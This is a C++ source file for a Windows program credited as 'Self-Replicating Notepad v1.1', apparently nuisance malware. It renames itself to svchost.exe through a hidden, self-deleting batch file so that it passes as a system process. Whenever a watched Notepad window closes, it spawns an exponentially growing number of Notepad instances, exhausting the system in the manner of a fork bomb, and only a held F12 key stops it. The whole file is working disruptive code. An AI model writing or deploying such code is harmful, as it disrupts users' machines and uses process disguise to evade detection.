#include <iostream>
#include <Windows.h>
#include <direct.h>
#define MAX _MAX_PATH


//Get PID
HWND hWindow = NULL;
LPCSTR LWindow = "Untitled - Notepad";
DWORD dwProcID = 0;

//Check if Running
BOOL IsProcessRunning(DWORD pid);
bool isrunning;

//Duplication
int amount = 1;
int firstopen = 0;

//Functions
std::string GetProcessName();
void Disguise();
void RunNew();


int WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int cmdShow)
{
	std::string currentName = GetProcessName();

	if (currentName != "svchost.exe")
	{
		Disguise();
		Sleep(150);
		exit(0);
	}

	while (!GetAsyncKeyState(VK_F12))
	{
		while (dwProcID == 0)
		{

			hWindow = FindWindowA(NULL, LWindow);

			if (hWindow)
			{
				GetWindowThreadProcessId(hWindow, &dwProcID);
			}
			
			if (!hWindow && firstopen < 1)
			{
				RunNew();
				firstopen++;
			}
		}

		if (dwProcID != 0)
		{
			isrunning = IsProcessRunning(dwProcID);

			if (!isrunning)
			{
				amount = amount * 2;
				
				for (int run = 0; run < amount; run++)
				{
					if (GetAsyncKeyState(VK_F12))
					{
						MessageBoxA(0, "[BG] Self-Replicating Notepad v1.1", "Credits", MB_ICONINFORMATION);
						exit(0);
					}
					RunNew();
				}
				Sleep(500);
				dwProcID = 0;
			}
			else if (isrunning)
				Sleep(20);
		}
	}
	MessageBoxA(0, "[BG] Self-Replicating Notepad v1.1", "Credits", MB_ICONINFORMATION);
}

BOOL IsProcessRunning(DWORD pid)
{
	HANDLE process = OpenProcess(SYNCHRONIZE, FALSE, pid);
	DWORD ret = WaitForSingleObject(process, 0);
	CloseHandle(process);
	return ret == WAIT_TIMEOUT;
}

std::string GetProcessName()
{
	TCHAR szExeFileName[MAX_PATH];
	GetModuleFileName(NULL, szExeFileName, MAX_PATH);
	const std::string path = szExeFileName;
	auto const pos = path.find_last_of("\\");
	const auto processname = path.substr(pos + 1);

	return processname;
}

void Disguise()
{
	char batname[MAX] = "disguise.bat";
	char batcmd[MAX] = "@echo off\nrename self_replicating_notepad.exe svchost.exe\nexit 0";
	FILE* fp;
	fp = fopen(batname, "w");
	fprintf(fp, batcmd);
	fprintf(fp, "\ndel %s", batname);
	fclose(fp);
	ShellExecute(NULL, "open", batname, NULL, NULL, SW_HIDE);
}

void RunNew()
{
	char batname[MAX] = "runnew.bat";
	char batcmd[MAX] = "@echo off\nnotepad.exe\nexit 0";
	char temppath[MAX];
	GetTempPath(MAX, temppath);
	FILE *fp;
	_chdir(temppath);
	fp = fopen(batname, "w");
	fprintf(fp, batcmd);
	strcat_s(temppath, "\\");
	strcat_s(temppath, batname);
	fprintf(fp, "\ndel %s", temppath);
	fclose(fp);
	ShellExecute(NULL, "open", temppath, NULL, NULL, SW_HIDE);
}